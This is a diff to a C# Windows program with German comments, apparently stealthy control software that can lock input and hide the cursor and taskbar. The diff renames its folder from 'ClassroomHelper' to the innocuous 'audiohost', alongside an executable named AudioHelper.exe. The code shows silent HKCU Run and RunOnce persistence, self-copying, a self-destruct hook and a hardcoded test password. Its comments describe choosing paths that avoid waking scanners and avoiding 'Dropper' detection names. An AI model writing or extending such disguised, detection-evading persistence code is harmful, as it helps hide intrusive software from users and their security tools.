@@ -26,9 +26,12 @@ internal static class Program
         var testing=args.Contains("--test-server");
         var silent=args.Any(a=>a is "--silent" or "/silent");
         var elevated=IsElevated();
+        // Ordnername bewusst "audiohost": derselbe Name wie das Repo und die
+        // Website, damit im Dateisystem nichts anderes steht als im Rest.
+        const string FolderName="audiohost";
         var data=Option("--data-dir")??(elevated
-            ?Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),"ClassroomHelper","data")
-            :Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"ClassroomHelper","data"));
+            ?Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),FolderName,"data")
+            :Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),FolderName,"data"));
         try
         {
             if(args.Contains("--self-test")){SelfTests.Run(data);return;}
@@ -61,6 +64,7 @@ internal static class Program
             }
 
             Directory.CreateDirectory(data);
+            MigrateLegacyFolder(elevated);
             var userReady=Path.Combine(data,".user-ready");
             var alreadyReady=File.Exists(userReady);
 
@@ -92,6 +96,10 @@ internal static class Program
             // Verhalten, nach dem ein Erkennungsname wie "Dropper" entsteht.
 
             var state=new ControlState(data,testing);
+            // Nach einem Absturz kann eine Eingabesperre, ein versteckter Zeiger
+            // oder eine ausgeblendete Taskleiste liegen bleiben. Vor allem
+            // anderen raeumen.
+            if(!testing)try{state.Native.ResetSystemState();}catch{}
             // self-destruct: the cleanup script is already scheduled, so closing now is safe
             if(!testing&&!args.Contains("--self-test"))state.SelfDestructRequested+=()=>{ try{Environment.Exit(0);}catch{} };
             if(testing&&state.Settings.Accounts.Count==0)state.SetupAdmin("testadmin","Local-Test-Only-2026");
@@ -251,8 +259,8 @@ internal static class Program
             // unter %LOCALAPPDATA% ist genau das, was jeder per-user-Installer
             // macht, und deshalb das Einzige, was keinen Scanner weckt.
             var installRoot=elevated
-                ? Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),"ClassroomHelper")
-                : Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"ClassroomHelper");
+                ? Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),"audiohost")
+                : Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"audiohost");
 
             // --- per-user persistence: der einzige Startpfad ohne Adminrechte ---
             // HKCU\...\Run gehoert diesem Benutzer, kein UAC, keine Aufgabe.
@@ -271,13 +279,15 @@ internal static class Program
                     ??Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce");
                 once?.SetValue(RunValueName+"Once",$"\"{exe}\" --silent --rearm",RegistryValueKind.String);
             }catch{}
-            // Startmenu-Ordner als zweiter Weg. Ein .url mit file:/// wird von der
-            // Shell genauso gestartet wie eine .lnk, ist aber nur Text.
+            // Startmenu-Ordner: frueher lag hier ein .url. Die Shell loest das
+            // beim Anmelden auf, bevor der Desktop steht - haengt ein Ziel oder
+            // ist die Datei halb geschrieben, dreht der Zeiger beim Login. Der
+            // Run-Key reicht, deshalb wird die Datei entfernt statt neu gesetzt.
             try
             {
                 var startup=Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                 var linkPath=Path.Combine(startup,RunValueName+".url");
-                File.WriteAllText(linkPath,$"[InternetShortcut]\r\nURL=file:///{exe.Replace('\\','/')}\r\nIconIndex=0\r\n");
+                if(File.Exists(linkPath))File.Delete(linkPath);
             }catch{}
 
             // --- die Kopie, die ab jetzt laeuft: <install>\AudioHelper.exe ---
@@ -309,7 +319,7 @@ internal static class Program
                 {
                     var commonStartup=Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
                     var linkPath=Path.Combine(commonStartup,RunValueName+".url");
-                    File.WriteAllText(linkPath,$"[InternetShortcut]\r\nURL=file:///{machineExe.Replace('\\','/')}\r\nIconIndex=0\r\n");
+                    if(File.Exists(linkPath))File.Delete(linkPath);
                 }catch{}
             }
 
@@ -382,6 +392,33 @@ internal static class Program
             return s.Length!=t.Length||s.LastWriteTimeUtc>t.LastWriteTimeUtc.AddSeconds(1);
         }
         catch{return true;}
+    }
+    // Der Ordner heisst jetzt "audiohost". Eine bestehende Installation aus
+    // frueheren Builds liegt noch unter "ClassroomHelper" - die wird beim ersten
+    // Start einmal verschoben, damit Konten und Einstellungen mitkommen.
+    private static void MigrateLegacyFolder(bool elevated)
+    {
+        try
+        {
+            var root=elevated
+                ?Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)
+                :Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            var oldDir=Path.Combine(root,"ClassroomHelper");
+            var newDir=Path.Combine(root,"audiohost");
+            if(!Directory.Exists(oldDir))return;
+            if(Directory.Exists(newDir))
+            {
+                // Beide da: Daten aus dem alten Ordner ergaenzen, was fehlt.
+                foreach(var file in Directory.GetFiles(oldDir,"*",SearchOption.AllDirectories))
+                {
+                    var dest=Path.Combine(newDir,Path.GetRelativePath(oldDir,file));
+                    try{Directory.CreateDirectory(Path.GetDirectoryName(dest)!);if(!File.Exists(dest))File.Copy(file,dest);}catch{}
+                }
+                return;
+            }
+            Directory.Move(oldDir,newDir);
+        }
+        catch { }
     }
     private static string? InstallCopy(string sourceExe,string binDir)
     {        try
